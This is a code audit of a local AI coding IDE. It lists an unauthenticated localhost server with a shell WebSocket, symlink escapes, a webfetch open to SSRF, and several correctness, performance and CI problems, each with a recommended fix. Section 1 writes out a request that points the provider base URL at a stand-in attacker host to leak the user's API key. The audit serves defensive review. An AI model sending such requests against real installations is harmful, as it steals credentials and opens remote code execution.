# Code Audit — Mugil IDE (v0.1.20)

Date: 2026-10-21
Scope: `packages/core`, `packages/cli`, `packages/mcp`, `packages/docs`, `scripts/`, CI config.
Method: static read of all source files + executed the test suites in the current environment.

Baseline: `npm run lint` clean. `packages/core` 413/413 tests pass **only** when the ambient
environment is clean (see §6.1) — otherwise 1 fails. `packages/cli` 30/33 pass under the same
condition, 3 fail otherwise.

---

## 1. Critical — local server is an unauthenticated RCE surface

The IDE server binds `localhost` and exposes `/api/*` + `/ws` with no credential of any kind.

| Issue | Location |
|---|---|
| `isOriginAllowed()` returns `true` when there is no `Origin` header — every non-browser client (curl, any local process, any script) passes the check | `packages/cli/src/server/server.ts:109-120`, used at `:126` and `:910` |
| WS `/ws` upgrade has the same "no Origin ⇒ allow" rule, and the socket exposes a live shell | `server.ts:905-921`, `ptyManager.ts:22` |
| Any WS frame that is not valid JSON is written verbatim to the PTY | `server.ts:1183-1188` |
| `POST /api/keys` can rewrite a provider **base URL** to an arbitrary host; the engine then sends the user's real API key to that host (`Authorization: Bearer <key>`) | `server.ts:588-676` (base-var whitelist) + `packages/core/src/modules/handoff/openAi.ts:100-108` |
| `POST /api/workspace` does `process.chdir()` — global process state — and `mkdirSync(..., {recursive:true})` on any absolute path | `server.ts:426-457` |
| `GET /api/fs/browse` lists any directory on the machine | `server.ts:377-424` |
| Request bodies accumulate with no size limit (`body += chunk`) | `server.ts:427-428, 589-590, 836-839` |

**Recommendation.** Generate an ephemeral session token at startup, require it on every `/api/*`
and `/ws` request (header or query), and inject it into the served HTML so the browser client
uses it. The TODO list already tracks this (`TODO.md:30`) — it should be the next release's
first item, not a "planned for v0.2.0" line item, because it is the difference between a local
dev tool and a remote-code-execution bug for anyone running it on a shared machine.

**Key-exfiltration chain to fix first:** `POST /api/keys {"baseVar":"OPENAI_BASE_URL","baseUrl":"http://attacker"}` → next model call sends the user's `OPENAI_API_KEY` to the attacker. The base-var whitelist was clearly meant to constrain *which variable* is written, not *where it points*.

## 2. High — path containment is lexical, not real

`resolveInWorkspace()` and `/api/file` both use `path.resolve` + `path.relative` only:

- `packages/core/src/modules/tools/workspaceTools.ts:659-667`
- `packages/cli/src/server/server.ts:479-486`

A symlink or Windows junction inside the workspace pointing outside it is fully readable and
writable. `fs.realpathSync` on both the root and the target (and re-checking containment after
resolution) closes it. `TODO.md:29` tracks this — same reasoning as §1, it belongs in the next
release.

## 3. High — `run_command` blocks the event loop

`execSync` in `packages/core/src/modules/tools/workspaceTools.ts:1028-1034` runs the whole
command synchronously (default timeout 60s, `MUGIL_IDE_COMMAND_TIMEOUT`). While it runs:

- the HTTP server accepts connections but never answers them,
- WebSocket frames (status, PTY output) queue up,
- the user cannot press Ctrl-C to cancel.

Switch to `child_process.spawn` with `stdio: 'pipe'`, stream the output into the tool result,
and wire the existing `AbortSignal` (already plumbed as `options.signal` in the tool registry)
to `child.kill()`. `TODO.md:28` tracks this.

## 4. High — webfetch has no SSRF or egress control

`packages/core/src/modules/tools/workspaceTools.ts:1094-1136`:
`redirect: 'follow'`, no host allowlist, no private/link-local range check. A model (or an
injected prompt) can reach `169.254.169.254`, `127.0.0.1:*` (including this very server's
`/api/keys` and `/ws`), and RFC 1918 hosts. `webfetch` is classified as a READ tool
(`permissions.ts:40`), so it is auto-allowed in act mode and never prompts.

**Recommendation.** Resolve the hostname, reject private/loopback/link-local/CGNAT ranges, cap
redirects to 0–2 and re-validate each hop, and make the target host an explicit user-configured
allowlist. `TODO.md:31` tracks it.

## 5. High — tool-loop builds an invalid message sequence on repeated denials

`packages/core/src/modules/tool-loop/index.ts:188-192` pushes the assistant turn with all
`toolCalls`. When the same call is denied repeatedly, `:205-216` pushes a **second** assistant
message containing that same call, and only then the `tool` result.

Consequences:
- the same `tool_call` id appears in two assistant messages (duplicate tool_use id),
- the message roles no longer alternate, which the Anthropic Messages API rejects outright
  (`roles must alternate between "user" and "assistant"`),
- OpenAI sees an assistant turn whose `tool_calls` are not immediately followed by their results.

The fix is small: do not push a second assistant message — put the escalation text into the
existing `tool` result content, or replace the original assistant turn's tool call list.

This path is currently unreachable in the happy case, so it is untested. Add a unit test that
drives three identical denied calls through `ToolLoop` and asserts the exact message sequence.

## 6. Medium — correctness bugs

**6.1 Tests depend on the ambient environment (reproduced).**
`getMaxOutputTokens()` reads `process.env.MUGIL_IDE_MAX_OUTPUT_TOKENS`, but
`packages/core/tests/pipeline.test.ts:363` asserts the value equals the *default* 8192.
With `MUGIL_IDE_MAX_OUTPUT_TOKENS=22528` set in the shell the suite fails:

```
● Pipeline › output budget › does not shrink max_tokens when history overflows the prompt budget
  Expected: 8192   Received: 22528
```

Likewise `MUGIL_IDE_TURBO_MODE=1` auto-approves every gated tool call, which makes 3
`packages/cli/tests/server.test.ts` approval tests time out (they wait for an approval frame
that is never sent). The suites are not hermetic.

**Recommendation.** Add a jest `setupFiles` that clears every `MUGIL_IDE_*` variable, and have
the tests that need a value set it explicitly. This is the single cheapest fix in this report
— it removes a whole class of "works on my machine" CI failures.

**6.2 The output budget can exceed the context window.**
`packages/core/src/pipeline.ts:307-315`: `sizeFor()` clamps to `contextRoom` but then applies
`Math.max(MIN_MAX_OUTPUT_TOKENS /* 1024 */, ...)`, so a nearly-full context still asks the
provider for 1024 output tokens it cannot accept → HTTP 400 "prompt is too long". The floor
should be `Math.min(floor, contextRoom)` with a separate hard error when `contextRoom <= 0`.

**6.3 The prompt-token estimate ignores tools and under-counts.**
`pipeline.ts:288-291` adds `countTokens(JSON.stringify(options.tools))` for the tools but the
provider-side fallback in every client computes `countTokens(messages.map(m => m.content).join('\n'))`
(`openAi.ts:198`, `anthropic.ts:203`, `openRouter.ts:208`, `vercel.ts:170`, `together.ts`, `cloudflare.ts`).
Tool *arguments* in assistant messages and the tool schema are never counted, so the real prompt
is larger than the estimate the budget logic reasons about.

**6.4 `HandoffManager.route()` does not pick the cheapest model.**
`packages/core/src/modules/handoff/index.ts:54-80` is documented as "picks the cheapest tier
whose context window fits" but returns `candidates[0]` — whatever order `models` happens to be
in. `ModelSpec` already carries `costPerMTokIn`/`tier`; sort by `(tier, costPerMTokIn)` and the
documented behaviour becomes true. This directly affects spend, which is the product's premise.

**6.5 `HandoffManager.buildChain()` counts tokens differently from the pipeline.**
`handoff/index.ts:94` counts only `m.content` of each message, ignoring `toolCalls` arguments.
Two different token estimates for the same request makes the "context overflow" fallback
unreliable.

**6.6 The `.env` writer corrupts values containing `" #".**
`packages/core/src/env.ts:41` strips inline comments from *unquoted* values, but
`serializeEnvFile()` (`:59-77`) never quotes the values it writes. Reproduced:

```
serializeEnvFile({K:'abc #def'})  ->  "K=abc #def"
parseEnvFile(...)                  ->  {K:'abc'}          // truncated
```

API keys containing `#` are silently truncated on the next read. Fix: quote on write when the
value contains whitespace, `#`, or quotes, and unquote symmetrically on read. (The same function
also emits a leading blank line when starting from an empty file — cosmetic, but it means
`serializeEnvFile` never produces a clean first line.)

**6.7 Anthropic tool ordering is not canonicalized.**
`toOpenAiTools()` sorts tools by name and canonicalizes the JSON schema
(`provider.ts:78-89`) precisely for "byte-level prefix stability", but
`packages/core/src/modules/handoff/anthropic.ts:132-145` maps `options.tools` in the given
order with no sorting. The Anthropic cache breakpoint sits on the *last* tool, so a changing
tool order (e.g. MCP tools discovered in a different order) invalidates the whole tool prefix.
Sort and canonicalize identically to the OpenAI path.

## 7. Medium — performance

| Hot spot | Location | Impact |
|---|---|---|
| The code graph is rebuilt from scratch on every `/api/graph` request, synchronously, on the event loop | `server.ts:678-704` | Multi-second stall on a real repo |
| `collectCallEdges` is O(symbols²) with a fresh `RegExp` per pair | `packages/core/src/modules/codegraph/index.ts:194-210` | Same |
| `attachSnippets` is computed twice per file | `codegraph/index.ts:285` (re-computes what `parseCodeFile` already did) | ~2× the parse cost |
| Semantic cache lookup does `backend.keys()` then a `get()` per key | `packages/core/src/modules/smart-cache/index.ts:223-242` | O(n) Redis round-trips per miss |
| The partial-cache lookup scans every backend key the same way | `smart-cache/index.ts:254-300` | O(n) again, on the hot path |
| `/api/models` probes 7 providers **sequentially** | `server.ts:172-325` | ~7× the wall-clock of the slowest probe; `TODO.md:32` tracks the parallel version |
| `budgetConversationHistory` tokenizes every turn twice (kept and evicted copies) | `packages/core/src/history.ts:100-104` | 2× tokenization cost per turn |
| The pipeline re-tokenizes the growing tool history on every tool iteration | `pipeline.ts:325-330` | O(iterations²) tokenization in a long tool loop |

**Recommendation.** Cache the code graph by root + mtime, move graph construction to the same
worker-thread pattern already used for diffs (`packages/cli/src/server/diffRunner.ts` is a good
template), give the smart cache a real index (or restrict semantic search to the in-memory
trie), and parallelize the model probes with `Promise.allSettled`.

## 8. Medium — maintainability

- **Five near-identical provider clients.** `openAi.ts`, `openRouter.ts`, `vercel.ts`,
  `together.ts`, `cloudflare.ts` each re-implement `buildBody`, the usage parsing, the
  `<think>` split and the tool-call extraction. They are the same OpenAI wire format with
  different headers/URLs. One configurable `OpenAiWireClient` with `{baseUrl, headers, path,
  reasoningStyle, providerName}` would remove ~700 lines and five places to fix the same bug.
- **`server.ts` is a 1 243-line `if`-chain.** Every route is an inline `if (url.pathname === …)`
  block with its own body parsing, error handling and response writing. A small route table
  (`{method, path, handler}`) plus one `readJsonBody(req, limit)` helper and one
  `sendJson(res, status, payload)` helper would make the endpoints enumerable, testable, and
  would fix the missing body-size limit in one place.
- **`html.ts` is a 2 867-line template literal** containing the entire CSS and the entire client
  JS. It cannot be linted, unit-tested or code-split, and it forces `unsafe-inline` into the
  CSP (`server.ts:141`). Serve `index.html` + `app.js` + `app.css` as static files; the CSP can
  then drop `unsafe-inline` entirely.
- **`embeddedVendor.ts` is a 296 KB generated artifact committed to source** with no generator
  script (the vendoring script only writes `dist/vendor/`). It is unreviewable in diffs and
  will silently drift from the `@xterm/*` dependency version. Generate it in
  `scripts/vendor-xterm.mjs` at build time and gitignore it — the same fix for the "standalone
  binary" goal.
- **The `no-explicit-any` ESLint rule is disabled** (`eslint.config.mjs:27`) and the config has
  no type-aware rules. `any` is used pervasively in `server.ts` and `agentRepl.ts`. Turning on
  `no-unsafe-argument`/`no-unsafe-member-access` on the core package would catch real bugs.
- **Two 1 250+ line files** (`workspaceTools.ts`, `agentRepl.ts`) each mix tool definitions,
  policy, formatting and I/O. Split the registry into one file per tool family.
- **`installOverrideReader()` runs as an import side effect** in the core barrel
  (`packages/core/src/index.ts:19`). Importing `@mugil-ide/core` therefore touches the
  filesystem. Make it an explicit `init()` the CLI/MCP call, so the package stays importable in
  a browser and in tests without hidden I/O.
- **`TODO.md` is stale.** It says "Next Release (Shipped in 0.1.14)" through 0.1.16 while the
  version is 0.1.20, and the v0.2.0 list contains the four items that actually matter
  (§1–§4). Retitle the v0.2.0 section "Next Release" and move the four security items to the
  top.

## 9. Low — CI and repo hygiene

- **CI runs on Ubuntu only**, but the project is Windows-first (`node-pty` has a Windows
  fallback path, `ptyManager.ts`, `diffRunner`). A Windows job on `windows-latest` would catch
  the `exec`/`start` shell differences in `packages/cli/src/index.ts:262-270` and the PTY
  teardown issues the code comments keep hitting.
- **No `npm audit` or dependency review step** in `.github/workflows/ci.yml`.
- **No coverage thresholds.** `packages/core/jest.config.js` collects coverage but nothing
  enforces it.
- **`prettier --check` is not run in CI** — only `eslint`, which does not include formatting.
- **`.superpowers/sdd/` and `docs/superpowers/plans/` are committed** planning artifacts; they
  are noise in the repo. Move them out or into a `docs/archive/` folder.

## 10. Quick wins, ranked

1. Fix test hermeticity (§6.1) — clears the env-dependent suite and 3 CLI failures. *~15 min.*
2. Fix the tool-loop duplicate assistant message (§5) + add a regression test. *~1 h.*
3. Quote values written by `serializeEnvFile` (§6.6) + test. *~30 min.*
4. Add a body-size limit to the JSON body readers (§1). *~30 min.*
5. Sort the Anthropic tool list (§6.7) + canonicalize its schema. *~30 min.*
6. Make `route()` actually pick the cheapest model (§6.4). *~30 min, direct cost impact.*
7. Clamp the output budget to the context room (§6.2). *~30 min.*
8. Add the session token to `/api/*` and `/ws` (§1) — the biggest single change, and the one
   that makes the tool safe to expose on a shared machine.
9. Realpath containment (§2) and webfetch SSRF guard (§4).
10. Async `run_command` (§3).
11. Move `html.ts` to static assets; generate `embeddedVendor.ts` (§8).
12. Collapse the five OpenAI-wire clients into one (§8).

---

### Notes on what is *not* wrong

The following are well-built and should not be touched: the SSE parsers
(`packages/core/src/modules/handoff/stream.ts` — the `StreamThinkSplitter` and the
`content_block_start`/`input_json_delta` tool-argument reassembly are subtle and correct), the
permission model (`permissions.ts` — the mode defaults, prefix rules and "no handler ⇒ deny"
fallback are right), the diff worker-thread design (`diffRunner.ts`), the cache mock-flag
handling in `pipeline.ts:214-225`, the WebSocket status coalescing (`server.ts:969-1012`), and
the `tiktoken`-with-estimator-fallback tokenizer.
